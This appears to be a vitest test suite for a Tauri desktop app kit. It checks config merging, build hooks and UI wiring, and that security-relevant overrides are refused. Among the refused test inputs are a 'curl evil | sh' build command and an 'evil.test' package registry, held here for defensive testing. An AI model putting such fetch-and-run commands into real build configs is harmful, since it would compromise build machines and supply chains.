import { existsSync, readFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it, vi } from "vitest";
import { buildTauriConfig, mergeAppTauriConfig } from "../lib/tauri-config";

// A buyer's app — the kit's own name refuses release builds (LICENSE.md §8).
vi.mock("@fuutu/config", async (importOriginal) => {
	const actual = await importOriginal<typeof import("@fuutu/config")>();
	return {
		...actual,
		config: {
			...actual.config,
			app: { ...actual.config.app, name: "Acme Notes" },
		},
	};
});

const APP = join(import.meta.dirname, "../..");
const read = (file: string) => readFileSync(join(APP, file), "utf8");
const base = { appVersion: "1.0.0", devUrl: "http://localhost:3002" };

/** The generated config with the app's (untyped) keys merged in. */
type Merged = {
	app: {
		macOSPrivateApi?: boolean;
		windows: { label?: string }[];
		security: { capabilities: unknown[] };
	};
	bundle?: { macOS?: unknown };
};

describe("APP_TAURI_CONFIG (scripts/lib/app-tauri-config.ts)", () => {
	it("an empty override leaves the generated config unchanged", () => {
		const config = buildTauriConfig({ ...base, mode: "build" });
		expect(mergeAppTauriConfig(config, {})).toEqual(config);
	});

	it("deep-merges into dev and release builds (objects merge, arrays replace)", () => {
		const appTauriConfig = {
			app: { macOSPrivateApi: true },
			bundle: {
				macOS: {
					infoPlist: "Info.plist",
					minimumSystemVersion: "13.0",
				},
			},
		};
		for (const mode of ["dev", "build"] as const) {
			const config = buildTauriConfig({
				...base,
				mode,
				appTauriConfig,
			}) as unknown as Merged;
			expect(config.app.macOSPrivateApi).toBe(true);
			expect(config.bundle?.macOS).toEqual(appTauriConfig.bundle.macOS);
			// Kit keys next to the merged ones survive.
			expect(config.app.windows[0]?.label).toBe("main");
			expect(config.app.security.capabilities[0]).toBe("default");
		}
		const merged = mergeAppTauriConfig(
			{ a: { list: [1, 2], keep: 1 } },
			{ a: { list: [3] } },
		);
		expect(merged).toEqual({ a: { list: [3], keep: 1 } });
	});

	it("refuses security-relevant keys", () => {
		for (const override of [
			{ identifier: "com.evil.app" },
			{ productName: "Other" },
			{ app: { security: { csp: null } } },
			{ app: { security: { capabilities: ["x"] } } },
			{ app: { withGlobalTauri: true } },
			{ plugins: { updater: { pubkey: "x" } } },
			{ plugins: { "deep-link": { desktop: { schemes: ["x"] } } } },
			{ build: { beforeBuildCommand: "curl evil | sh" } },
			{ bundle: { createUpdaterArtifacts: false } },
			{ bundle: { externalBin: ["x"] } },
			{ bundle: { windows: { signCommand: "x" } } },
		]) {
			expect(
				() =>
					buildTauriConfig({
						...base,
						mode: "build",
						appTauriConfig: override,
					}),
				JSON.stringify(override),
			).toThrow(/app-tauri-config\.ts[\s\S]*not overridable/);
		}
	});

	it("refuses an override that drops the main window", () => {
		expect(() =>
			buildTauriConfig({
				...base,
				mode: "build",
				appTauriConfig: { app: { windows: [{ label: "other" }] } },
			}),
		).toThrow(/main/);
	});
});

describe("build.rs hook (src-tauri/app_build.rs)", () => {
	it("the kit build.rs calls it once", () => {
		expect(existsSync(join(APP, "src-tauri/app_build.rs"))).toBe(true);
		const build = read("src-tauri/build.rs");
		expect(build).toMatch(/#\[path = "app_build\.rs"\]\s*mod app_build;/);
		expect(build.match(/app_build::run\(\)/g)).toHaveLength(1);
		expect(build).toContain("cargo:rerun-if-changed=app_build.rs");
	});
});

describe("app-ext crate (src-tauri/app-ext)", () => {
	it("is a workspace path dependency of the kit crate", () => {
		const kit = read("src-tauri/Cargo.toml");
		expect(kit).toMatch(/^app-ext = \{ path = "app-ext" \}$/m);
		expect(kit).toMatch(/members = \[[^\]]*"app-ext"/);
		const ext = read("src-tauri/app-ext/Cargo.toml");
		expect(ext).toMatch(/^name = "app-ext"$/m);
		expect(existsSync(join(APP, "src-tauri/app-ext/src/lib.rs"))).toBe(true);
	});
});

describe("sidecar build step (app-sidecars.mjs build())", () => {
	it("the kit workflow runs it per matrix job, before the build, without secrets", () => {
		const yaml = read("../../.github/workflows/desktop.yml");
		const step = yaml.slice(yaml.indexOf("- name: Build sidecars"));
		const block = step.slice(0, step.indexOf("\n      - ", 1));
		expect(block).toContain("node scripts/build-sidecars.mjs");
		expect(block).toContain("${{ matrix.target }}");
		expect(block).not.toMatch(/secrets\./);
		expect(yaml.indexOf("- name: Build sidecars")).toBeLessThan(
			yaml.indexOf("- name: Build\n"),
		);
	});

	it("calls build() when the app exports one, else does nothing", async () => {
		const { buildSidecars } = await import("../build-sidecars.mjs");
		await expect(buildSidecars({}, { target: "x" })).resolves.toBe(false);
		const build = vi.fn();
		await expect(
			buildSidecars({ build }, { target: "aarch64-apple-darwin" }),
		).resolves.toBe(true);
		expect(build).toHaveBeenCalledWith({ target: "aarch64-apple-darwin" });
	});
});

describe("apps/desktop/.gitignore", () => {
	it("ignores sidecar binaries", () => {
		expect(read(".gitignore")).toMatch(/^binaries\/$/m);
	});
});

describe("UI hooks (app-owned files read by the kit shell)", () => {
	const POINTS: [string, string, RegExp][] = [
		[
			"src/app-nav.ts",
			"src/components/app-shell.tsx",
			/\{ appNavItems \} from "@\/app-nav"/,
		],
		[
			"src/app-shell-slot.tsx",
			"src/components/app-shell.tsx",
			/\{ appShellSlots \} from "@\/app-shell-slot"/,
		],
		[
			"src/app-home.tsx",
			"src/app/(main)/page.tsx",
			/\{ appHome \} from "@\/app-home"/,
		],
		[
			"src/app-about.tsx",
			"src/app/about/page.tsx",
			/\{ appAboutSection \} from "@\/app-about"/,
		],
		[
			"scripts/lib/app-tauri-config.ts",
			"scripts/lib/tauri-config.ts",
			/\{[^}]*APP_TAURI_CONFIG[^}]*\} from "\.\/app-tauri-config"/,
		],
	];
	for (const [file, kit, wired] of POINTS) {
		it(`${file} is read by ${kit}`, () => {
			expect(existsSync(join(APP, file)), file).toBe(true);
			expect(read(kit)).toMatch(wired);
		});
	}
});

describe("tray menu hooks (src-tauri/src/app_plugins.rs)", () => {
	it("the kit tray adds the app's items and hands it unknown ids", () => {
		expect(existsSync(join(APP, "src-tauri/src/app_plugins.rs"))).toBe(true);
		const shell = read("src-tauri/src/shell.rs");
		expect(shell).toMatch(/crate::app_plugins::tray_items\(app, /);
		expect(shell).toMatch(
			/other => crate::app_plugins::on_tray_menu\(app, other\)/,
		);
	});
});

describe("cargo-deny exceptions (src-tauri/deny.app.toml)", () => {
	it("appends the app's exception tables to the kit policy", async () => {
		const { denyConfig } = await import("../cargo-deny.mjs");
		const merged = denyConfig(
			'[licenses]\nallow = ["MIT"]\n',
			'[[licenses.exceptions]]\ncrate = "x"\nallow = ["CDLA-Permissive-2.0"]\n\n[[advisories.ignore]]\nid = "RUSTSEC-0000-0000"\nreason = "not reachable"\n\n[[bans.skip]]\ncrate = "y"\n',
		);
		expect(merged).toContain('[licenses]\nallow = ["MIT"]');
		expect(merged).toContain('[[licenses.exceptions]]\ncrate = "x"');
	});

	it("refuses anything but exception tables (the policy stays the kit's)", async () => {
		const { denyConfig } = await import("../cargo-deny.mjs");
		for (const extra of [
			'[licenses]\nallow = ["GPL-3.0"]\n',
			'allow-registry = ["https://evil.test"]\n',
			"[[sources.allow-git]]\n",
			'[advisories]\nyanked = "allow"\n',
		]) {
			expect(() => denyConfig("", extra), extra).toThrow(/deny\.app\.toml/);
		}
	});

	it("the kit policy lists exceptions as tables, and CI runs the merged config", () => {
		expect(read("src-tauri/deny.toml")).not.toMatch(/^exceptions = \[/m);
		expect(read("src-tauri/deny.toml")).toMatch(
			/^\[\[licenses\.exceptions\]\]$/m,
		);
		const yaml = read("../../.github/workflows/desktop.yml");
		expect(yaml).toContain("node ../scripts/cargo-deny.mjs");
		expect(yaml).not.toMatch(/run: cargo deny check/);
	});
});

describe("setup steps hook (src/app-setup-steps.tsx)", () => {
	it("the access gate runs them: pre-auth in front of the sign-in card, the app only after", () => {
		expect(existsSync(join(APP, "src/app-setup-steps.tsx"))).toBe(true);
		const gate = read("src/components/access-gate.tsx");
		expect(gate).toMatch(
			/from "@\/components\/setup-steps"|from "\.\/setup-steps"/,
		);
		const signIn = gate.slice(gate.indexOf('case "sign_in":'));
		expect(signIn.slice(0, 200)).toMatch(/<SetupSteps decision="sign_in">/);
		// The sign-in branch never renders the app (children).
		const branch = signIn.slice(0, signIn.indexOf("</SetupSteps>"));
		expect(branch).not.toContain("{children}");
	});
});

describe("Tauri plugins in app-ext (permission forwarding)", () => {
	it("app-ext re-exports, the kit build.rs imports before tauri_build", () => {
		const ext = read("src-tauri/app-ext/Cargo.toml");
		expect(ext).toMatch(/^links = "app-ext"$/m);
		expect(read("src-tauri/app-ext/build.rs")).toContain(
			"build_forward::reexport_plugin_permissions()",
		);
		const build = read("src-tauri/build.rs");
		expect(
			build.indexOf("build_forward::import_app_ext_plugin_permissions()"),
		).toBeLessThan(build.indexOf("tauri_build::build()"));
	});
});
